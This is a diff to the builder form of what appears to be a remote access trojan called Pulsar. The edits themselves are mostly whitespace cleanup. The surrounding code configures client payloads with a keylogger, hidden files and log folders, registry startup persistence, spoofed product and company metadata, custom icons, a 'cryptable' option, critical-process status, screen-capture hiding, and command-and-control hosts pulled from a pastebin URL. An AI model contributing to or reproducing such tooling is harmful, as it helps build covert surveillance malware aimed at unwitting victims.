@@ -32,7 +32,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);            
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
@@ -56,11 +56,11 @@ namespace Pulsar.Server.Forms
             portSetDelayTimer = new System.Windows.Forms.Timer();
             portSetDelayTimer.Interval = 1000;
             portSetDelayTimer.Tick += PortSetDelayTimer_Tick;
-            
+
             checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
             chkCryptable.CheckedChanged += ChkCryptable_CheckedChanged;
         }
-        
+
         private void CheckBox1_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
@@ -147,14 +147,14 @@ namespace Pulsar.Server.Forms
                 }
             }
         }
-        
+
         private void UpdatePastebinUI()
         {
             txtHost.Enabled = !checkBox1.Checked;
             numericUpDownPort.Enabled = !checkBox1.Checked;
             btnAddHost.Enabled = !checkBox1.Checked;
             lstHosts.Enabled = !checkBox1.Checked;
-            
+
             txtPastebin.Enabled = checkBox1.Checked;
         }
 
@@ -282,7 +282,7 @@ namespace Pulsar.Server.Forms
             chkHide.Checked = profile.HideFile;
             chkHideSubDirectory.Checked = profile.HideSubDirectory;
             chkStartup.Checked = profile.AddStartup;
-            txtRegistryKeyName.Text = profile.RegistryName;            
+            txtRegistryKeyName.Text = profile.RegistryName;
             chkChangeIcon.Checked = profile.ChangeIcon;
             txtIconPath.Text = profile.IconPath;
             LoadIconPreview(profile.IconPath);
@@ -334,7 +334,7 @@ namespace Pulsar.Server.Forms
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
             profile.LogDirectoryName = txtLogDirectoryName.Text;
-            profile.HideLogDirectory = chkHideLogDirectory.Checked;            
+            profile.HideLogDirectory = chkHideLogDirectory.Checked;
             profile.ProductName = txtProductName.Text;
             profile.Description = txtDescription.Text;
             profile.CompanyName = txtCompanyName.Text;
@@ -393,7 +393,7 @@ namespace Pulsar.Server.Forms
             // I also allowed hosts to still use 127.0.0.1 if they want to debug ~Biggy
             if (txtHost.Text.Contains("127.0.0.1") && !Models.Settings.AllowLocalhost)
             {
-                MessageBox.Show("Hey dumbass any localhost ips wont connect to your server."); 
+                MessageBox.Show("Hey dumbass any localhost ips wont connect to your server.");
                 return;
             }
 
@@ -406,12 +406,12 @@ namespace Pulsar.Server.Forms
                     if (hostI.Hostname.ToString().Contains("127.0.0.1"))
                     {
                         _hosts.Remove(hostI);
-                         break;
+                        break;
                     }
                 }
-                
+
             }
-             
+
             HasChanged();
 
             var host = txtHost.Text;
@@ -521,8 +521,8 @@ namespace Pulsar.Server.Forms
         private void chkCriticalProcess_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
-        }        
-        
+        }
+
         private void btnBrowseIcon_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
@@ -568,9 +568,9 @@ namespace Pulsar.Server.Forms
             {
                 options.RawHosts = txtPastebin.Text;
                 options.Pastebin = true;
-                
+
                 // Validate the pastebin URL
-                if (string.IsNullOrWhiteSpace(options.RawHosts) || 
+                if (string.IsNullOrWhiteSpace(options.RawHosts) ||
                     (!options.RawHosts.StartsWith("http://") && !options.RawHosts.StartsWith("https://")))
                 {
                     throw new Exception("Please enter a valid URL for the pastebin. It should start with http:// or https://");
@@ -580,13 +580,13 @@ namespace Pulsar.Server.Forms
             {
                 options.Pastebin = false;
                 options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
-                
+
                 if (options.RawHosts.Length < 2)
                 {
                     throw new Exception("Please enter a valid host to connect to.");
                 }
             }
-            
+
             options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
@@ -861,11 +861,12 @@ namespace Pulsar.Server.Forms
             txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
             txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
             txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
-        }        private void UpdateIconControlStates()
+        }
+        private void UpdateIconControlStates()
         {
             txtIconPath.Enabled = chkChangeIcon.Checked;
             btnBrowseIcon.Enabled = chkChangeIcon.Checked;
-            
+
             // Clear icon preview when disabled
             if (!chkChangeIcon.Checked)
             {
@@ -978,9 +979,9 @@ namespace Pulsar.Server.Forms
                         {
                             string tempIconPath = Path.Combine(Path.GetTempPath(), $"{Path.GetFileNameWithoutExtension(ofd.FileName)}_{Guid.NewGuid()}.ico");
                             Icon iconextracted = Icon.ExtractAssociatedIcon(ofd.FileName);
-                            
+
                             Bitmap bitmap = iconextracted.ToBitmap();
-                            bitmap.Save("out.bmp");
+                            //bitmap.Save("out.bmp");
 
                             SaveBitmapAsIcon(bitmap, tempIconPath);
 
@@ -1103,5 +1104,6 @@ namespace Pulsar.Server.Forms
         {
 
         }
+
     }
 }
